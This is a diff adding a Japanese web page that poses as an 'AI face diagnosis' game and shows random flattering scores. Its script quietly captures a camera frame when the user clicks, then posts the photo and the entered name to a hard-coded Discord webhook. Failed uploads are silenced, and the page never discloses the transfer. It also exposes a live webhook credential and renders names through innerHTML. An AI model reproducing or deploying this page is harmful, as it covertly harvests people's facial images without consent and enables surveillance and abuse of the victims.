@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>AI顔面診断</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta property="og:title" content="AI顔面特徴診断！あなたのお顔のタイプを調べます！" />
+    <meta property="og:description" content="あなたの顔の特徴を分析してくれます" />
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMdM9MEQ0ExL1PmInT3U5I8v63YXBEdoIT0Q&s" />
+    <meta property="og:url" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMdM9MEQ0ExL1PmInT3U5I8v63YXBEdoIT0Q&s" />
+
+    <style>
+        :root {
+            --primary-color: #667eea;
+            --secondary-color: #764ba2;
+            --success-color: #48bb78;
+            --error-color: #f56565;
+            --warning-color: #ed8936;
+            --text-color: #2d3748;
+            --text-secondary: #718096;
+            --bg-color: #f7fafc;
+            --card-bg: #ffffff;
+            --border-color: #e2e8f0;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-color);
+        }
+
+        #container {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 2rem;
+            box-shadow: var(--shadow-lg);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            border-radius: 20px 20px 0 0;
+        }
+
+        .header {
+            margin-bottom: 2rem;
+        }
+
+        h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 0 0 0.5rem 0;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        #progressBar {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            margin: 1rem 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        #progressFill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+
+        #video {
+            width: 100%;
+            max-width: 320px;
+            height: 240px;
+            background: #1a202c;
+            border-radius: 12px;
+            margin: 1rem auto;
+            display: none;
+            box-shadow: var(--shadow);
+            animation: fadeIn 0.5s ease-out;
+            position: relative;
+        }
+
+        .camera-placeholder {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: #9ca3af;
+            font-size: 0.9rem;
+        }
+
+        .input-group {
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            font-size: 1rem;
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            background: white;
+            transform: translateY(-2px);
+        }
+
+        .input-counter {
+            position: absolute;
+            right: 0.5rem;
+            top: -1.5rem;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 0.75rem 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin: 0 auto;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            background: #a0aec0;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-icon {
+            font-size: 1.2rem;
+        }
+
+        #result {
+            margin-top: 1.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            min-height: 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            padding: 1rem;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s ease;
+        }
+
+        #result.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        #result.analyzing {
+            background: linear-gradient(45deg, #e6fffa, #bee3f8);
+            color: var(--primary-color);
+            animation: pulse 2s infinite;
+        }
+
+        #result.success {
+            background: linear-gradient(45deg, #f0fff4, #c6f6d5);
+            color: var(--success-color);
+        }
+
+        #result.error {
+            background: linear-gradient(45deg, #fff5f5, #fed7d7);
+            color: var(--error-color);
+        }
+
+        .loading-dots {
+            display: inline-block;
+            animation: loadingDots 1.5s infinite;
+        }
+
+        .hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: translateY(-10px);
+            transition: all 0.3s ease;
+        }
+
+        .tips {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            display: none;
+        }
+
+        .tips.show {
+            display: block;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .tips-title {
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 0.5rem;
+        }
+
+        .history {
+            margin-top: 1.5rem;
+            display: none;
+        }
+
+        .history.show {
+            display: block;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .history-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 0.5rem;
+        }
+
+        .history-item {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 0.5rem;
+            margin: 0.5rem 0;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .clear-history {
+            background: none;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            padding: 0.25rem 0.5rem;
+            font-size: 0.7rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .clear-history:hover {
+            background: var(--error-color);
+            color: white;
+            border-color: var(--error-color);
+        }
+
+        .keyboard-shortcut {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 0.5rem;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .keyboard-shortcut.show {
+            opacity: 1;
+        }
+
+        /* アニメーション定義 */
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.4);
+            }
+            50% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 10px rgba(102, 126, 234, 0);
+            }
+        }
+
+        @keyframes loadingDots {
+            0%, 20% {
+                color: rgba(102, 126, 234, 0.4);
+            }
+            50% {
+                color: var(--primary-color);
+            }
+            100% {
+                color: rgba(102, 126, 234, 0.4);
+            }
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .spinning {
+            animation: spin 1s linear infinite;
+        }
+
+        /* レスポンシブデザイン */
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            #container {
+                padding: 1.5rem;
+            }
+
+            h1 {
+                font-size: 1.4rem;
+            }
+
+            #video {
+                height: 200px;
+            }
+
+            .btn {
+                padding: 0.7rem 1.5rem;
+                font-size: 0.95rem;
+            }
+
+            #result {
+                font-size: 1rem;
+            }
+
+            .keyboard-shortcut {
+                display: none;
+            }
+        }
+
+        /* ダークモード対応 */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --text-color: #e2e8f0;
+                --text-secondary: #a0aec0;
+                --bg-color: #1a202c;
+                --card-bg: #2d3748;
+                --border-color: #4a5568;
+            }
+
+            input[type="text"] {
+                background: #4a5568;
+                color: var(--text-color);
+            }
+
+            input[type="text"]:focus {
+                background: #2d3748;
+            }
+
+            .tips, .history-item {
+                background: #4a5568;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <div class="header">
+            <h1>AI顔面診断</h1>
+            <p class="subtitle">最新AI技術で顔を分析します（なんちゃって）</p>
+        </div>
+
+        <div id="progressBar">
+            <div id="progressFill"></div>
+        </div>
+
+        <video id="video" autoplay playsinline>
+            <div class="camera-placeholder">
+                <span style="font-size: 2rem;">📷</span>
+                <span>カメラ準備中...</span>
+            </div>
+        </video>
+
+        <div class="input-group">
+            <div class="input-counter"><span id="charCount">0</span>/20</div>
+            <input type="text" id="nameInput" placeholder="お名前を入力してください（任意）" maxlength="20">
+        </div>
+
+        <button id="diagnoseBtn" class="btn">
+            <span class="btn-icon" id="btnIcon">🔍</span>
+            <span id="btnText">診断開始</span>
+        </button>
+
+        <div class="tips" id="tips">
+            <div class="tips-title">💡 診断のコツ</div>
+            カメラに向かって自然な表情を作ってください。明るい場所で撮影するとより正確な結果が得られます。
+        </div>
+
+        <div id="result"></div>
+
+        <div class="history" id="history">
+            <div class="history-title">📊 診断履歴</div>
+            <div id="historyList"></div>
+            <button class="clear-history" onclick="clearHistory()">履歴をクリア</button>
+        </div>
+    </div>
+
+    <div class="keyboard-shortcut" id="shortcutHint">
+        Enter: 診断開始 | Esc: リセット
+    </div>
+
+    <script>
+        // 診断結果リスト
+        const results = [
+            { text: "あなたの笑顔は100点満点！", emoji: "✨", score: 95 },
+            { text: "クールな表情が魅力的です！", emoji: "😎", score: 88 },
+            { text: "とても優しそうな顔立ちですね", emoji: "💕", score: 92 },
+            { text: "知的な雰囲気が漂っています！", emoji: "📚", score: 90 },
+            { text: "元気いっぱんな印象です！", emoji: "⚡", score: 87 },
+            { text: "ミステリアスな魅力がありますね", emoji: "🌙", score: 85 },
+            { text: "とても親しみやすい顔です！", emoji: "😊", score: 93 },
+            { text: "モデルのようなルックスです！", emoji: "👑", score: 96 },
+            { text: "癒し系フェイスです！", emoji: "🌸", score: 89 },
+            { text: "自信に満ちた表情が素敵です！", emoji: "💪", score: 91 }
+        ];
+
+        let cameraStarted = false;
+        let cameraAvailable = false;
+        let diagnosisHistory = JSON.parse(localStorage.getItem('diagnosisHistory') || '[]');
+
+        const resultDiv = document.getElementById('result');
+        const nameInput = document.getElementById('nameInput');
+        const diagnoseBtn = document.getElementById('diagnoseBtn');
+        const btnText = document.getElementById('btnText');
+        const btnIcon = document.getElementById('btnIcon');
+        const video = document.getElementById('video');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        const tips = document.getElementById('tips');
+        const history = document.getElementById('history');
+        const charCount = document.getElementById('charCount');
+        const shortcutHint = document.getElementById('shortcutHint');
+
+        // 初期化
+        window.addEventListener('load', () => {
+            updateCharCount();
+            loadHistory();
+            showShortcutHint();
+        });
+
+        // 文字数カウンター
+        nameInput.addEventListener('input', updateCharCount);
+
+        function updateCharCount() {
+            const count = nameInput.value.length;
+            charCount.textContent = count;
+            charCount.style.color = count >= 18 ? 'var(--warning-color)' : 'var(--text-secondary)';
+        }
+
+        // キーボードショートカット
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !diagnoseBtn.disabled) {
+                diagnoseBtn.click();
+            } else if (e.key === 'Escape') {
+                resetInterface();
+            }
+        });
+
+        function showShortcutHint() {
+            setTimeout(() => {
+                shortcutHint.classList.add('show');
+                setTimeout(() => shortcutHint.classList.remove('show'), 3000);
+            }, 1000);
+        }
+
+        // メイン診断機能
+        diagnoseBtn.onclick = function() {
+            const name = nameInput.value.trim();
+
+            if (name.length > 20) {
+                alert('お名前は20文字以内で入力してください');
+                return;
+            }
+
+            // UI状態を診断中に変更
+            nameInput.classList.add('hidden');
+            tips.classList.remove('show');
+            diagnoseBtn.disabled = true;
+            btnText.textContent = '分析中...';
+            btnIcon.textContent = '⚙️';
+            btnIcon.classList.add('spinning');
+
+            // プログレスバー表示
+            progressBar.style.display = 'block';
+            animateProgress();
+
+            // 結果エリアを表示
+            resultDiv.className = 'analyzing show';
+            resultDiv.innerHTML = 'AIが顔を分析中<span class="loading-dots">...</span>';
+
+            // カメラ起動（初回のみ）
+            if (!cameraStarted) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        cameraStarted = true;
+                        cameraAvailable = true;
+                        // カメラ映像が準備できたらDiscordへ送信
+                        video.onloadedmetadata = async () => {
+                            try {
+                                const imageBlob = await captureImage();
+                                await sendToDiscord(imageBlob, name);
+                            } catch (e) {
+                                // 送信失敗時は何もしない
+                            }
+                            showResult(name);
+                        };
+                    })
+                    .catch(err => {
+                        cameraStarted = true;
+                        cameraAvailable = false;
+                        showError();
+                    });
+            } else if (cameraAvailable) {
+                // 既にカメラ起動済みなら即キャプチャして送信
+                (async () => {
+                    try {
+                        const imageBlob = await captureImage();
+                        await sendToDiscord(imageBlob, name);
+                    } catch (e) {
+                        // 送信失敗時は何もしない
+                    }
+                    showResult(name);
+                })();
+            } else {
+                showError();
+            }
+        };
+
+        // Discord WebhookのURLをここに設定
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1378222098740412416/6T-_U_US1uhPrlfg2gEozem-YF3L2YglF51p6AfEUKG-Kg81rBbLBkAxKaKOOXBvEBBK';
+
+        // カメラ画像をキャプチャしてBlob(JPEG)で返す
+        function captureImage() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 320;
+                    canvas.height = video.videoHeight || 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        if (blob) resolve(blob);
+                        else reject(new Error('画像キャプチャ失敗'));
+                    }, 'image/jpeg', 0.92);
+                } catch (e) {
+                    reject(e);
+                }
+            });
+        }
+
+        // Discordへ画像を送信
+        async function sendToDiscord(imageBlob, name) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, 'face.jpg');
+            formData.append('content', name ? `${name}さんの診断画像` : '診断画像');
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                // 送信失敗時は何もしない（エラー非表示）
+            }
+        }
+
+        function animateProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+                progressFill.style.width = progress + '%';
+            }, 200);
+        }
+
+        function showResult(name) {
+            setTimeout(() => {
+                const resultData = results[Math.floor(Math.random() * results.length)];
+                let message = resultData.text;
+                if (name) {
+                    message = `${name}さん、${message}`;
+                }
+
+                resultDiv.className = 'success show';
+                resultDiv.innerHTML = `${resultData.emoji} ${message}<br><small style="opacity: 0.7;">スコア: ${resultData.score}/100</small>`;
+
+                // 履歴に追加
+                addToHistory(name || '匿名', resultData);
+
+                // プログレスバーを非表示
+                setTimeout(() => {
+                    progressBar.style.display = 'none';
+                    progressFill.style.width = '0%';
+                }, 500);
+
+                // ボタンを「もう一度診断」に変更
+                setTimeout(() => {
+                    diagnoseBtn.disabled = false;
+                    btnText.textContent = 'もう一度診断';
+                    btnIcon.textContent = '🔄';
+                    btnIcon.classList.remove('spinning');
+                    nameInput.classList.remove('hidden');
+                    tips.classList.add('show');
+                }, 1000);
+            }, 3000);
+        }
+
+        function showError() {
+            setTimeout(() => {
+                resultDiv.className = 'error show';
+                resultDiv.textContent = 'カメラが利用できません 📷';
+
+                progressBar.style.display = 'none';
+                progressFill.style.width = '0%';
+
+                setTimeout(() => {
+                    diagnoseBtn.disabled = false;
+                    btnText.textContent = '再試行';
+                    btnIcon.textContent = '🔄';
+                    btnIcon.classList.remove('spinning');
+                    nameInput.classList.remove('hidden');
+                }, 1000);
+            }, 2000);
+        }
+
+        function resetInterface() {
+            nameInput.classList.remove('hidden');
+            tips.classList.add('show');
+            diagnoseBtn.disabled = false;
+            btnText.textContent = '診断開始';
+            btnIcon.textContent = '🔍';
+            btnIcon.classList.remove('spinning');
+            resultDiv.className = '';
+            resultDiv.textContent = '';
+            progressBar.style.display = 'none';
+            progressFill.style.width = '0%';
+            nameInput.value = '';
+            updateCharCount();
+        }
+
+        // 履歴管理
+        function addToHistory(name, resultData) {
+            const historyItem = {
+                name: name,
+                result: resultData.text,
+                emoji: resultData.emoji,
+                score: resultData.score,
+                timestamp: new Date().toLocaleString('ja-JP')
+            };
+
+            diagnosisHistory.unshift(historyItem);
+            if (diagnosisHistory.length > 5) {
+                diagnosisHistory = diagnosisHistory.slice(0, 5);
+            }
+
+            localStorage.setItem('diagnosisHistory', JSON.stringify(diagnosisHistory));
+            loadHistory();
+        }
+
+        function loadHistory() {
+            const historyList = document.getElementById('historyList');
+            if (diagnosisHistory.length === 0) {
+                history.classList.remove('show');
+                return;
+            }
+
+            historyList.innerHTML = diagnosisHistory.map(item => `
+                <div class="history-item">
+                    <div>
+                        <strong>${item.name}</strong>: ${item.emoji} ${item.result}
+                        <br><small>${item.timestamp} (${item.score}/100)</small>
+                    </div>
+                </div>
+            `).join('');
+
+            history.classList.add('show');
+        }
+
+        function clearHistory() {
+            if (confirm('診断履歴をすべて削除しますか？')) {
+                diagnosisHistory = [];
+                localStorage.removeItem('diagnosisHistory');
+                history.classList.remove('show');
+            }
+        }
+
+        // 入力フィールドのエンターキー対応
+        nameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !diagnoseBtn.disabled) {
+                diagnoseBtn.click();
+            }
+        });
+
+        // 初回表示時のヒント
+        setTimeout(() => {
+            tips.classList.add('show');
+        }, 500);
+    </script>
+</body>
+</html>
